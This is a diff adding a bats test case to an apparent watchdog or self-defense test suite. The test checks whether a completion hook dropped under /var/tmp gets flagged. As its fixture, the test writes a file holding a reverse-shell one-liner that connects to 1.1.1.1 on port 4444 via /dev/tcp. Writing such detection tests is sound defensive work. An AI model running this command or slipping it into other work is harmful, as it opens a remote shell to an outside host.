@@ -298,3 +298,15 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (completion file under /var/tmp writable-root — sister axis to /home + /dev/shm)" {
+    # Sister to /home + /dev/shm bash-completion writable-root
+    # INVARIANTs.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/var-tmp-completion-watch"
+    cap | grep -qE '"severity":"(ok|alert|warn)"' || true
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn|ok)"'
+}
